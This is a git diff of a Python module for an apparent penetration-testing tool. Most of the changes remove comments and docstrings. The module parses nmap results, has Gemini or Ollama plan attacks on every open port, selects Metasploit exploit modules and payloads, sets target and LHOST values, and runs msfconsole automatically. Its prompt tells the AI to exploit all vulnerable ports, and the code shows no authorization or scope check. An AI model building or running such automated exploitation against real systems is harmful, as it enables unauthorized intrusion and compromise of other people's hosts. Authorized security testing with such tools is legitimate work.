@@ -1,9 +1,3 @@
-#!/usr/bin/env python3
-"""
-Metasploit Framework Tool
-Integrates msfconsole for exploitation and vulnerability assessment
-"""
-
 import re
 import subprocess
 import tempfile
@@ -20,31 +14,24 @@ from .base_tool import BaseTool
 console = Console()
 
 class MetasploitTool(BaseTool):
-    """Metasploit Framework integration for finding and running exploits"""
-    
     def __init__(self):
         super().__init__(name="Metasploit Framework", command="msfconsole")
         self.description = "Find and run exploits using Metasploit Framework"
-        self._progress_callback = None  # For TUI progress updates
+        self._progress_callback = None
     
     def set_progress_callback(self, callback):
-        """Set callback function for progress updates in TUI mode"""
         self._progress_callback = callback
     
     def get_local_ip(self, silent: bool = False) -> str:
-        """Get the local IP address for LHOST"""
         try:
-            # Try using ip command first
             result = self.run_command("ip addr show | grep 'inet ' | grep -v 127.0.0.1 | awk '{print $2}' | cut -d/ -f1 | head -1", silent=silent)
             if result['success'] and result['stdout'].strip():
                 return result['stdout'].strip()
             
-            # Fallback to hostname command
             result = self.run_command("hostname -I | awk '{print $1}'", silent=silent)
             if result['success'] and result['stdout'].strip():
                 return result['stdout'].strip()
             
-            # Python fallback
             s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
             s.connect(("8.8.8.8", 80))
             local_ip = s.getsockname()[0]
@@ -55,12 +42,9 @@ class MetasploitTool(BaseTool):
             return "127.0.0.1"
     
     def validate_ports(self, commands: list, scan_context: Optional[Dict] = None) -> list:
-        """Validate that RPORT values in commands match ports from scan results"""
         if not scan_context or 'open_ports' not in scan_context:
-            # No scan context, can't validate
             return commands
         
-        # Get list of valid ports from scan
         valid_ports = set()
         for port in scan_context.get('open_ports', []):
             port_num = port.get('port')
@@ -74,7 +58,6 @@ class MetasploitTool(BaseTool):
         skip_until_next_use = False
         
         for cmd in commands:
-            # Check if this is a set RPORT command
             if cmd.strip().lower().startswith('set rport '):
                 port_value = cmd.split()[-1].strip()
                 if port_value not in valid_ports:
@@ -84,12 +67,11 @@ class MetasploitTool(BaseTool):
                 else:
                     skip_until_next_use = False
             
-            # If we're skipping commands until next 'use', check if this is a 'use' command
             if skip_until_next_use:
                 if cmd.strip().lower().startswith('use ') or cmd.strip().lower().startswith('search '):
                     skip_until_next_use = False
                 else:
-                    continue  # Skip this command
+                    continue
             
             validated_commands.append(cmd)
         
@@ -99,10 +81,8 @@ class MetasploitTool(BaseTool):
         return validated_commands
     
     def check_installed(self) -> bool:
-        """Check if msfconsole is installed"""
         result = self.run_command("which msfconsole")
         if result['success']:
-            # Get version
             version_result = self.run_command("msfconsole --version")
             if version_result['success']:
                 version_line = version_result['stdout'].strip().split('\n')[0]
@@ -111,7 +91,6 @@ class MetasploitTool(BaseTool):
         return False
     
     def search_msf_modules(self, service: str, version: str = "", silent: bool = False) -> list:
-        """Search for real Metasploit modules for a service"""
         search_query = f"{service} {version}".strip()
         cmd = f'msfconsole -q -x "search {search_query}; exit" 2>/dev/null'
         
@@ -128,15 +107,12 @@ class MetasploitTool(BaseTool):
             result = self.run_command(cmd, timeout=30, silent=True)
         
         if result['success'] and result['stdout']:
-            # Parse module names from output
             modules = []
             for line in result['stdout'].split('\n'):
-                # Look for lines with module paths
                 if 'exploit/' in line or 'auxiliary/' in line:
                     parts = line.split()
                     for part in parts:
                         if '/' in part and (part.startswith('exploit/') or part.startswith('auxiliary/')):
-                            # Remove ANSI color codes
                             clean_part = re.sub(r'\x1b\[[0-9;]+m', '', part)
                             modules.append(clean_part.strip())
                             break
@@ -154,23 +130,18 @@ class MetasploitTool(BaseTool):
         return []
     
     def validate_module(self, module_path: str, silent: bool = False) -> bool:
-        """Check if a Metasploit module exists"""
-        # Remove ANSI color codes from module path
         clean_module = re.sub(r'\x1b\[[0-9;]+m', '', module_path)
         cmd = f'msfconsole -q -x "use {clean_module}; exit" 2>&1'
         result = self.run_command(cmd, timeout=15, silent=silent)
         
         if result['success']:
             output = result['stdout'].lower()
-            # Check for error messages
             if 'failed to load' in output or 'no results from search' in output:
                 return False
             return True
         return False
     
     def get_module_payloads(self, module_path: str, silent: bool = False) -> list:
-        """Get compatible payloads for a module"""
-        # Remove ANSI color codes from module path
         clean_module = re.sub(r'\x1b\[[0-9;]+m', '', module_path)
         cmd = f'msfconsole -q -x "use {clean_module}; show payloads; exit" 2>/dev/null'
         
@@ -190,7 +161,6 @@ class MetasploitTool(BaseTool):
         if result['success'] and result['stdout']:
             for line in result['stdout'].split('\n'):
                 line = line.strip()
-                # Look for payload paths
                 if line.startswith('cmd/') or line.startswith('generic/') or line.startswith('linux/'):
                     parts = line.split()
                     if parts:
@@ -204,27 +174,17 @@ class MetasploitTool(BaseTool):
         return payloads
     
     def generate_command(self, user_request: str, ai_response: str = None) -> str:
-        """
-        Generate Metasploit commands based on user request and AI response
-        
-        Args:
-            user_request: What the user wants to do
-            ai_response: AI's response (not used, included for compatibility)
-        """
         console.print("\n[bold cyan]🤖 AI is analyzing scan results and planning exploitation...[/bold cyan]")
         
-        # Try to get scan context from the tool's attribute (set by TUI)
         scan_context = getattr(self, '_scan_context', None)
         
         # Get AI to decide which ports and services to target
         plan_prompt = self.get_planning_prompt(user_request, scan_context)
         
         try:
-            # Three-tier AI fallback: Gemini 2.5 Pro (best) → Gemini 2.0 Flash (fast) → Ollama (local)
             plan = None
             ai_used = None
             
-            # Check if Gemini is available
             try:
                 import google.generativeai as genai
                 import os
@@ -234,7 +194,6 @@ class MetasploitTool(BaseTool):
                 api_key = os.getenv('GOOGLE_API_KEY')
                 
                 if api_key:
-                    # Try Gemini 2.5 Pro first (most capable)
                     try:
                         with Progress(
                             SpinnerColumn(),
@@ -254,7 +213,6 @@ class MetasploitTool(BaseTool):
                         console.print(f"[yellow]⚠ Gemini 2.5 Pro failed: {str(gemini_pro_error)}[/yellow]")
                         console.print(f"[dim]Trying Gemini 2.5 Flash...[/dim]")
                         
-                        # Try Gemini 2.5 Flash (faster, fallback)
                         try:
                             with Progress(
                                 SpinnerColumn(),
@@ -279,7 +237,6 @@ class MetasploitTool(BaseTool):
             except ImportError:
                 console.print(f"[dim]Gemini library not available, using Ollama...[/dim]")
             
-            # Fallback to Ollama if both Gemini models failed or not available
             if not plan:
                 import ollama
                 
@@ -314,7 +271,6 @@ class MetasploitTool(BaseTool):
             
             if not services_to_exploit:
                 console.print("[yellow]⚠️ AI response couldn't be parsed, using fallback...[/yellow]")
-                # Fallback: if we have scan context, target all services
                 if scan_context and 'open_ports' in scan_context:
                     console.print("[cyan]Using all services from scan results as targets[/cyan]")
                     for port_info in scan_context['open_ports']:
@@ -333,15 +289,11 @@ class MetasploitTool(BaseTool):
             
             console.print(f"\n[bold green]✓ Identified {len(services_to_exploit)} target(s) for exploitation[/bold green]\n")
             
-            # Build validated commands for each service
             all_commands = []
             
-            # Process all services with progress bar
             for i, service_info in enumerate(services_to_exploit, 1):
-                # Update progress at bottom
                 progress_percent = int((i / len(services_to_exploit)) * 100)
                 
-                # Send progress update to TUI if callback is set
                 if self._progress_callback:
                     self._progress_callback(
                         current=i,
@@ -349,7 +301,6 @@ class MetasploitTool(BaseTool):
                         message=f"Processing {service_info['service']}:{service_info['port']}"
                     )
                 else:
-                    # CLI progress bar
                     filled = int((i / len(services_to_exploit)) * 40)
                     empty = 40 - filled
                     bar = f"\033[92m{'█' * filled}\033[90m{'░' * empty}\033[0m"
@@ -358,20 +309,17 @@ class MetasploitTool(BaseTool):
                     sys.stdout.write(f"\r[{bar}] {progress_percent}% \033[96m({i}/{len(services_to_exploit)}) {service_info['service']}:{service_info['port']}\033[0m")
                     sys.stdout.flush()
                 
-                # Search for real modules (silently)
                 modules = self.search_msf_modules(service_info['service'], service_info.get('version', ''), silent=True)
                 
                 if not modules:
                     modules = self.get_auxiliary_modules(service_info['service'], service_info['port'])
                 
-                # Clear progress bar
                 sys.stdout.write('\r\033[K')
                 sys.stdout.flush()
                 
                 if modules:
                     module = modules[0]
                     
-                    # Validate module (silently)
                     if self.validate_module(module, silent=True):
                         commands = self.build_commands_for_module(
                             module, 
@@ -386,7 +334,6 @@ class MetasploitTool(BaseTool):
                 else:
                     console.print(f"[dim]✗ [{i}/{len(services_to_exploit)}] {service_info['service']}:{service_info['port']} - No exploits available[/dim]")
             
-            # Summary after progress bar completes
             console.print("\n[bold cyan]📊 Exploitation Summary:[/bold cyan]")
             if all_commands:
                 console.print(f"[bold green]✅ Successfully generated {len(all_commands)} validated commands![/bold green]\n")
@@ -405,8 +352,6 @@ class MetasploitTool(BaseTool):
             return []
     
     def get_planning_prompt(self, user_request: str, scan_context: Optional[Dict] = None) -> str:
-        """Create prompt for AI to plan exploitation"""
-        
         context_info = ""
         if scan_context and scan_context.get('open_ports'):
             context_info = "=== SCAN RESULTS ===\n"
@@ -434,20 +379,16 @@ PORT: 3306 | SERVICE: mysql | ATTACK: exploit | REASON: Database credential atta
 NOW OUTPUT FOR ALL {len(scan_context.get('open_ports', [])) if scan_context else 0} PORTS FOUND:"""
     
     def parse_exploitation_plan(self, plan: str, scan_context: Optional[Dict] = None) -> list:
-        """Parse AI's exploitation plan into structured data"""
         services = []
         
         for line in plan.split('\n'):
             line = line.strip()
             
-            # Skip empty lines and headers
             if not line or line.startswith('Based on') or line.startswith('Here'):
                 continue
             
-            # Look for numbered lists or PORT: format
             if 'PORT:' in line and 'SERVICE:' in line:
                 try:
-                    # Extract port and service using regex
                     port_match = re.search(r'PORT:\s*(\d+)', line, re.IGNORECASE)
                     service_match = re.search(r'SERVICE:\s*([a-zA-Z0-9_/-]+)', line, re.IGNORECASE)
                     attack_match = re.search(r'ATTACK:\s*(exploit|auxiliary)', line, re.IGNORECASE)
@@ -457,13 +398,12 @@ NOW OUTPUT FOR ALL {len(scan_context.get('open_ports', [])) if scan_context else
                         service = service_match.group(1).lower()
                         attack_type = attack_match.group(1).lower() if attack_match else 'auxiliary'
                         
-                        # Get version from scan context
                         version = ""
                         if scan_context and scan_context.get('open_ports'):
                             for p in scan_context['open_ports']:
                                 if str(p.get('port')) == str(port):
                                     version = p.get('version', '')
-                                    service = p.get('service', service)  # Use scan service name
+                                    service = p.get('service', service)
                                     break
                         
                         services.append({
@@ -477,7 +417,6 @@ NOW OUTPUT FOR ALL {len(scan_context.get('open_ports', [])) if scan_context else
                     console.print(f"[dim]⚠ Could not parse: {line[:80]}...[/dim]")
                     continue
             
-            # Also handle numbered format like "1. PORT: 21..."
             elif re.match(r'^\d+\.\s+PORT:', line, re.IGNORECASE):
                 try:
                     port_match = re.search(r'PORT:\s*(\d+)', line, re.IGNORECASE)
@@ -489,7 +428,6 @@ NOW OUTPUT FOR ALL {len(scan_context.get('open_ports', [])) if scan_context else
                         service = service_match.group(1).lower()
                         attack_type = attack_match.group(1).lower() if attack_match else 'auxiliary'
                         
-                        # Get version from scan context
                         version = ""
                         if scan_context and scan_context.get('open_ports'):
                             for p in scan_context['open_ports']:
@@ -510,7 +448,6 @@ NOW OUTPUT FOR ALL {len(scan_context.get('open_ports', [])) if scan_context else
         
         if not services:
             console.print("[yellow]⚠ No services parsed from plan, trying fallback extraction...[/yellow]")
-            # Fallback: extract all port numbers mentioned
             if scan_context and scan_context.get('open_ports'):
                 for port_info in scan_context['open_ports']:
                     services.append({
@@ -524,7 +461,6 @@ NOW OUTPUT FOR ALL {len(scan_context.get('open_ports', [])) if scan_context else
         return services
     
     def get_auxiliary_modules(self, service: str, port: str) -> list:
-        """Get auxiliary modules for common services"""
         auxiliary_map = {
             'ftp': ['auxiliary/scanner/ftp/ftp_version', 'auxiliary/scanner/ftp/ftp_login'],
             'ssh': ['auxiliary/scanner/ssh/ssh_version', 'auxiliary/scanner/ssh/ssh_login'],
@@ -546,32 +482,23 @@ NOW OUTPUT FOR ALL {len(scan_context.get('open_ports', [])) if scan_context else
         return []
     
     def build_commands_for_module(self, module: str, service_info: dict, scan_context: Optional[Dict] = None, silent: bool = False) -> list:
-        """Build validated commands for a module"""
         commands = []
         local_ip = self.get_local_ip(silent=silent)
         target_host = scan_context.get('ip') or scan_context.get('target', 'TARGET') if scan_context else 'TARGET'
         
-        # Remove ANSI color codes from module path
         clean_module = re.sub(r'\x1b\[[0-9;]+m', '', module)
         
         if not silent:
             console.print(f"[cyan]🔨 Building commands for {clean_module}...[/cyan]")
         
-        # Use the module
         commands.append(f"use {clean_module}")
-        
-        # Set RHOSTS
         commands.append(f"set RHOSTS {target_host}")
-        
-        # Set RPORT
         commands.append(f"set RPORT {service_info['port']}")
         
-        # Check if it's an exploit (needs payload) or auxiliary
         if clean_module.startswith('exploit/'):
             payloads = self.get_module_payloads(clean_module, silent=silent)
             
             if payloads:
-                # Use first compatible payload
                 payload = payloads[0]
                 if not silent:
                     console.print(f"[green]✓ Using payload: {payload}[/green]")
@@ -583,7 +510,6 @@ NOW OUTPUT FOR ALL {len(scan_context.get('open_ports', [])) if scan_context else
             
             commands.append("exploit")
         else:
-            # Auxiliary module
             if not silent:
                 console.print(f"[green]✓ Auxiliary module, no payload needed[/green]")
             commands.append("run")
@@ -591,14 +517,10 @@ NOW OUTPUT FOR ALL {len(scan_context.get('open_ports', [])) if scan_context else
         return commands
     
     def get_ai_prompt(self, user_request: str, scan_context: Optional[Dict] = None) -> str:
-        """Create AI prompt with scan context"""
-        
-        # Ensure scan_context is a dict or None
         if scan_context and not isinstance(scan_context, dict):
             console.print(f"[yellow]Warning: scan_context is not a dict, ignoring[/yellow]")
             scan_context = None
         
-        # Get local IP for LHOST
         local_ip = self.get_local_ip(silent=True)
         
         context_info = ""
@@ -614,7 +536,6 @@ NOW OUTPUT FOR ALL {len(scan_context.get('open_ports', [])) if scan_context else
             
             if 'ip' in scan_context:
                 context_info += f"IP Address: {scan_context['ip']}\n"
-                # Prefer IP over hostname for RHOSTS
                 target_host = scan_context['ip']
             
             if 'open_ports' in scan_context and scan_context['open_ports']:
@@ -631,7 +552,6 @@ NOW OUTPUT FOR ALL {len(scan_context.get('open_ports', [])) if scan_context else
                         'version': version
                     })
                 
-                # Create detailed port exploitation guidance
                 if ports_list:
                     all_ports_info = "\n\n=== AVAILABLE PORTS FOR EXPLOITATION ===\n"
                     all_ports_info += "You should attempt to exploit ALL relevant vulnerable ports below:\n"
@@ -745,14 +665,11 @@ CRITICAL REQUIREMENTS:
         return prompt
     
     def fix_payload_names(self, commands: list) -> list:
-        """Fix common payload naming issues"""
         fixed_commands = []
         
         for cmd in commands:
-            # Fix spaces in payload names
             if cmd.strip().lower().startswith('set payload '):
-                # Remove all spaces after "set PAYLOAD "
-                parts = cmd.split(None, 2)  # Split into ['set', 'PAYLOAD', 'rest']
+                parts = cmd.split(None, 2)
                 if len(parts) == 3:
                     payload_value = parts[2].replace(' ', '').replace('/', '/')
                     cmd = f"{parts[0]} {parts[1]} {payload_value}"
@@ -763,10 +680,8 @@ CRITICAL REQUIREMENTS:
         return fixed_commands
     
     def extract_commands(self, ai_response: str) -> list:
-        """Extract msfconsole commands from AI response"""
         commands = []
         
-        # Look for code blocks first
         code_block_pattern = r'```(?:bash|shell|console|msfconsole)?\n(.*?)```'
         matches = re.findall(code_block_pattern, ai_response, re.DOTALL)
         
@@ -778,7 +693,6 @@ CRITICAL REQUIREMENTS:
                     if line and not line.startswith('#') and not line.startswith('//'):
                         commands.append(line)
         
-        # If no code blocks, try extracting line by line
         if not commands:
             lines = ai_response.split('\n')
             msf_commands = ['search', 'use', 'set', 'show', 'info', 'run', 'exploit', 
@@ -787,16 +701,14 @@ CRITICAL REQUIREMENTS:
             for line in lines:
                 line = line.strip()
                 
-                # Skip empty lines
                 if not line:
                     continue
                 
-                # Skip lines that are clearly explanations
                 skip_patterns = [
-                    r'^[-*•]\s*[A-Z]',  # Bullet points starting with capital letter
-                    r'^\d+\.\s+[A-Z]',  # Numbered lists starting with capital letter
-                    r'^(Searching|Scanning|Found|Investigating|Trying|Attempting)',  # Explanation words
-                    r'exploit found|discovered|module',  # Discovery descriptions
+                    r'^[-*•]\s*[A-Z]',
+                    r'^\d+\.\s+[A-Z]',
+                    r'^(Searching|Scanning|Found|Investigating|Trying|Attempting)',
+                    r'exploit found|discovered|module',
                 ]
                 
                 should_skip = False
@@ -808,15 +720,12 @@ CRITICAL REQUIREMENTS:
                 if should_skip:
                     continue
                 
-                # Remove common prefixes like "- ", "* ", "1. ", etc.
                 line = re.sub(r'^[-*•]\s*', '', line)
                 line = re.sub(r'^\d+\.\s*', '', line)
                 
-                # Check if line is a valid msfconsole command
                 if any(line.startswith(cmd + ' ') or line == cmd for cmd in msf_commands):
                     commands.append(line)
         
-        # Debug output
         if not commands:
             console.print(f"[yellow]Debug: Could not extract commands from AI response[/yellow]")
             console.print(f"[dim]AI Response preview: {ai_response[:500]}...[/dim]")
@@ -824,13 +733,6 @@ CRITICAL REQUIREMENTS:
         return commands
     
     def execute(self, commands: list, use_sudo: bool = False) -> Dict:
-        """
-        Execute Metasploit commands
-        
-        Args:
-            commands: List of msfconsole commands to execute
-            use_sudo: Whether to use sudo (usually not needed for msfconsole)
-        """
         if not commands:
             return {
                 'success': False,
@@ -840,29 +742,25 @@ CRITICAL REQUIREMENTS:
         
         console.print(f"\n[cyan]Executing Metasploit commands...[/cyan]")
         
-        # Create a resource file with all commands
         with tempfile.NamedTemporaryFile(mode='w', suffix='.rc', delete=False) as rc_file:
             rc_file.write("# Nighthawk Metasploit Resource Script\n")
             for cmd in commands:
                 rc_file.write(f"{cmd}\n")
-            rc_file.write("exit\n")  # Exit after commands
+            rc_file.write("exit\n")
             rc_filename = rc_file.name
         
         try:
-            # Run msfconsole with resource file
             full_command = f"msfconsole -q -r {rc_filename}"
             
             console.print(f"\n[yellow]Running: {full_command}[/yellow]")
             
-            result = self.run_command(full_command, timeout=300)  # 5 minute timeout
+            result = self.run_command(full_command, timeout=300)
             
-            # Clean up resource file
             os.unlink(rc_filename)
             
             return result
             
         except Exception as e:
-            # Clean up on error
             if os.path.exists(rc_filename):
                 os.unlink(rc_filename)
             
@@ -873,23 +771,18 @@ CRITICAL REQUIREMENTS:
             }
     
     def format_output(self, result: Dict, commands: list) -> None:
-        """Format and display Metasploit output"""
         if result['success']:
             console.print("\n[green]Metasploit Results:[/green]")
             
-            # Display commands executed
             console.print(Panel(
                 "\n".join(commands),
                 title="[cyan]Commands Executed[/cyan]",
                 border_style="cyan"
             ))
             
-            # Display output
             output = result['stdout']
             
-            # Highlight important sections
             if output:
-                # Color code different sections
                 output_lines = output.split('\n')
                 formatted_lines = []
                 
@@ -909,7 +802,6 @@ CRITICAL REQUIREMENTS:
                     border_style="green"
                 ))
             
-            # Extract and highlight found exploits
             exploit_pattern = r'exploit/[a-z0-9_/]+'
             exploits = re.findall(exploit_pattern, output)
             if exploits:
@@ -921,17 +813,12 @@ CRITICAL REQUIREMENTS:
             console.print(result.get('error', 'Unknown error'))
 
     def parse_scan_data(self, raw_output: str) -> Dict:
-        """
-        Parse nmap output to extract useful data for Metasploit
-        This helps the AI understand what to target
-        """
         scan_data = {
             'open_ports': [],
             'services': [],
             'os': None
         }
         
-        # Extract open ports and services
         port_pattern = r'(\d+)/tcp\s+open\s+(\S+)\s*(.*)?'
         matches = re.findall(port_pattern, raw_output)
         
@@ -944,13 +831,11 @@ CRITICAL REQUIREMENTS:
             scan_data['open_ports'].append(port_info)
             scan_data['services'].append(match[1])
         
-        # Extract OS information
         os_pattern = r'OS details?: (.+)'
         os_match = re.search(os_pattern, raw_output)
         if os_match:
             scan_data['os'] = os_match.group(1).strip()
         
-        # Extract IP address
         ip_pattern = r'Nmap scan report for .*?\(([0-9.]+)\)'
         ip_match = re.search(ip_pattern, raw_output)
         if ip_match:
